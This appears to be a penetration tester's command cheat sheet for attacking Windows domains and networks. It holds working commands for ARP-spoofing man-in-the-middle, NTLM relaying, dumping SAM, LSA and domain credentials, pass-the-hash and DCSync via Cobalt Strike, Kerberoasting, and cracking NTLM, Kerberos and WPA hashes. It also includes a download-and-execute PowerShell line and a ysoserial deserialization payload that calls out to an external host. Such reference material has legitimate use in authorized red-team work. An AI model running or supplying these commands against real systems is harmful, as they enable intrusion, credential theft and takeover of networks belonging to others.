#### Run Run ####
###install python2.7
sudo apt-get update
sudo apt-get install build-essential checkinstall
sudo apt-get install libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev
==> ignore the error
cd /usr/src
wget https://www.python.org/ftp/python/2.7.18/Python-2.7.18.tgz
sudo tar xzf Python-2.7.18.tgz
cd Python-2.7.18
sudo ./configure --enable-optimizations
sudo make altinstall
update-alternative --install /usr/bin/python python /usr/bin/python2.7 1

---------------------
**grep IP***
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
---------------------

**Mount**
---------------------
mount -t cifs //<ip>//<share name/ /mnt/share -o username=<username>

**SOCATS**
------------------------
On Kali:
	Setup Proxychains to leverage pivot on PID 6336
		socks4 <external Teamserver IP> 9001
	Setup socat through proxychains so it takes RDP requests and pushes them to the end victim
		proxychains socat TCP-LISTEN:3389,fork TCP4:10.3.7.86:3389
	Obtain IP address of local Kali system

On Attacker-Windows system:
	Open RDP and RDP w/ valid victim credentials to the IP of your Kali system
	Done!
	
** Ettercap ** 
Step 1: arp -n #checking the current ARP table and confirm MAC address
Step 2: echo 1 > /proc/sys/net/ipv4/ip_forward # enable IP Forwarding
Step 3: Uncommend the Linux section in /etc/ettercap/etter.conf for iptables
Step 4: run ettercap -G (for gui) or try the following command lines:
	- ettercap -T -q -M arp:remote /target1(gateway)// /target2//
	- Press h to go to option
	- Press s for statistics
	- press c for connection list
	- Press l for host list
Step 5: Proper shutdown ettercap: Select Mitm > Stop mitm attack and Start -> Stop Sniffing. Then quit

#Should never issue a SIGKILL message to Ettercap (for example, killall -9 ettercap, kill -p `pidof ettercap`. Press q to quit ettercap.


**Nmap**
--------------------
###From @killswitch-GUI :: 

Discovery - nmap -Pn -n -sS -p 21-23,25,53,111,137,139,445,80,443,8443,8080 --min-hostgroup 255 --min-rtt-timeout 0ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 2000 -oA CLIENT-# -vvv --open -iL <IPLIST>

Full - nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA <customer-#> -vvv --open -iL <IPLIST>
------------------------------------------------
***find domain controller***
Note***: needs to sweep for port 88 and edit the /etc/resolv.conf to the found IP

then use the following method:
nslookup -type=srv _ldap._tcp.dc._msdcs."acme.com" --> change acme.com to target Domain name
--------------------
or 
https://github.com/puzzlepeaches/scripts/blob/main/dcfinder.sh this sometimes works dependent on the network for quick DC enumeration
------------------------------------------------
**Responder/Ntlmrelayx**
--------------------
Responder -
Analysis Mode - python Responder.py -I <interface> -A
Business Mode - python Responder.py -I <interface> -r -d -w

Relayx -
DISABLE SMB and HTTP in: /usr/share/responder/Responder.conf
cme smb <CIDR> --gen-relay-list targets.txt
ntlmrelayx.py -tf targets.txt (dumps successfully authenticated system's SAM database)

**CME**
--------------------
*BASIC*
Basic System Details - cme smb <IP>
Check User Authentication - cme smb -u <username> -p '<password>' -d <domain> <IP>
Check User Authentication via hash - cme smb -u <username> -H <ntlm> -d <domain> <IP> --shares

**ADMIN**
cme smb -u <username> -p <password> -d <domain> <IP> --sam
cme smb -u <username> -p <password> -d <domain> <IP> --lsa
cme smb -u <username> -p <password> -d <domain> <IP> --shares
cme smb -u <username> -p <password> -d <domain> <IP> --sessions
cme smb -u <username> -p <password> -d <domain> <IP> --loggedon-users
cme smb -u <username> -p <password> -d <domain> <IP> --pass-pol
cme smb -u <username> -p <password> -d <domain> <IP> -x '<cmd command>'
cme smb -u <username> -p <password> -d <domain> <IP> -X '<powershell command>'

**Remote Access**
------------------
impacket-wmiexec <domain>/<user>:<password>@<IP>
impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>

**CS**
--------------------
- ./teamserver <ip> <password> 2019-MM-DD /path/to/C2/c2.profile
**kerbrute**
----------------------------------
./kerbrute --dc #ip_dc -d domain_name userenum users.txt --downgrade -> to etype 23 format for hashcat


-----------------------------------
****Bloodhound-python****
-----------------------------------
bloodhound-python -u user@full-domain -p 'PASS' -d full-domain -ns dc-ip -c all
-----------------------------------4
**BloodHound**
--------------------
- execute-assembly /path/to/sharphound.exe --CollectionMethod  All --NoSaveCache --CompressData
- powershell-import sharphound.ps1
- powerpick Invoke-BloodHound -CollectionMethod  Session -LoopDelay 120 MaxLoopTime 0d0h10m0s
- powerpick Invoke-BloodHound --CollectionMethod All --NoSaveCache --RandomFilenames
- powerpick Invoke-BloodHound --CollectionMethod All
- Download Bloodhound.zip

## Inveigh ##
- powershell-import inveigh.ps1
- powerpick Invoke-Inveigh ConsoleOutput Y

## Kerberoast ##
- powershell-import autokerberoast.ps1
- powerpick invoke-autokerberoast -Groupname "*admin*"

## Rubeus ##
- execute-assembly /path/to/rubeus.exe kerberoast /outfile:hashes.txt /format:hashcast

## Powersploit ##
- powerpick Invoke-AllChecks (/opt/PowerSploit/Privesc/PowerUp.ps1)
- powerpick Find-LocalAdminAccess (/opt/PowerSploit/Recon/PowerView.ps1)
- powerpick Invoke-ShareFinder -CheckShareAccess (/opt/PowerSploit/Recon/PowerView.ps1)
- powerrpick Invoke-UserHunter -UserName "<username>" (/opt/PowerSploit/Recon/PowerView.ps1)

## Seatbelt ## 
- execute-assembly /root/Desktop/Seatbelt.exe InterestingFiles

**Shell Commands**
- shell net use
- shell net user <user> /domain
- shell net localgroups "<groupname>"
- shell net group "Domain Admins"
- shell net group "<group>" /domain | find /I "<name>"
- shell dir /s /b *passw*.*
- shell dir /s /b "Groups.xml"
- shell dir /s /b "Unattend.xml
- shell whoami /all
- shell systeminfo
- shell netstat -ano
- shell net computers
- shell systeminfo
- shell sc query
- shell sc qc <service name>

**Beacon\User\Token Manipulation**
- spawn https\http
- spawnas <domain>\<username> <password>
- wmi <FQDN or IP> http

- make_token <domain>\<username> <password>
- pth <domain>\<user> <hash>

- dsync to <domain>\<user> <password>
- dcsync <domain> ossdomain\<user>
- dcsync <FQDN domain> <domain>\<machine>$

- inject <pid> x64\x86 http

**Burp**
--------------------
- java -jar -Xmx2G /path/to/burpsuite.jar --project-file=<name>.burp

**Burp Socks Proxy**
---------------------
1) Create an ssh tunnel specifying the SOCKS proxy port with the -D option -> ssh user@server_name_or_ip_address -D 4321
2) Use netstat to verify that the port we specified is listening on our attacking system -> netstat -ant |grep -i listen
3) Tell Burp Suite to use our SOCKS proxy by specifying the IP address and port number in the user options tab -> Host: 127.0.0.1 Port: 4321

**Gobuster**
--------------------
- gobuster dir --url <URL> -w </path/to/wordlist/> -x .php,.txt,.html -s "200" -t 30 -o go_output.txt

Eyewitness
--------------------
- ./EyeWitness.py --headless -d <company_name> -f  ~/path/to/server_file/<file>.txt 

Aquatone
--------------------
- wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
- unzip aquatone_linux_amd64_1.7.0.zip
- cat <list_of_servers.txt> | aquatone 
########################################################################
Sub-domain enum
findomain --quiet -t target.com -u findomain_target
Use the output for subfinder
subfinder -all -nW -dL findomain_target -oI subfinder_findomain -silent -v

########################################################################

Hashcat
--------------------
<-Hash Types->
Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) --> -m 19600
Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) --> -m 19700
Kerberos 5 TGS-REP etype 23 (RC4-HMAC-MD5) --> -m 13100

NTLM --> 1000
NTLMV1 --> -m 5500
NTLMV2 --> -m 5600

- ./hashcat -w 2 -O -a 0 -m <hash type> <hashes_to_crack.txt> <wordlist.txt>
- ./hashcat -w 2 -O -a 0 -m <hash type> <hashes_to_crack.txt> <wordlist.txt> -r /rules/best64.rule

##########################################################################
Wireless
##########################################################################
# Connect wifi with command line
#check device
iw dev
# check if enable
ip link show wlan0
# if not enable, turn on
ip link set wlan0 up
# check if link
iw wlan0 link
# scan network to connect
iw wlan0 scan | grep SSID
#
wpa_passphrase SSID from above >> /etc/wpa_supplicant.conf
#
wpa_supplicant -B -D wext -i wlan0 -c /etc/wpa_supplicant.conf
# Check if connect
iw wlan0 link
# if not
dhclient wlan0
------------------------------------------------------------------------------------
reaver -i mon0 -b bssid -d 30 -S -N -vv
------------------------------------------------------------------------------------
cap2hccapx wpa2psk.dump wpa2psk.hccapx
hashcap -m 2500 -a 3 wpa2psk.hccapx "?l?l?l?l?l?l?l?l"
echo 0123456789abcdfg > lowerhex.hcchr
hashcat -m 2500 -a 3 wpa2psk.hccapx -1 lowerhex.hcchr "?1?1?1?1?1?1?1?1"
------------------------------------------------------------------------------------

Powershell use TLS 1.0 to connect to the website, if the website didn't allow TSL1.0 we need to force Powershell to connect the support version of TLS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Then we can use IEX(IWR -UseBasicParsing -Uri https:///.ps1)

------------------------------------------------------------------------------------
./ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "nslookup yuwewp90p365hx64wh7rumz8kzqxem.burpcollaborator.net" -o base64 -t
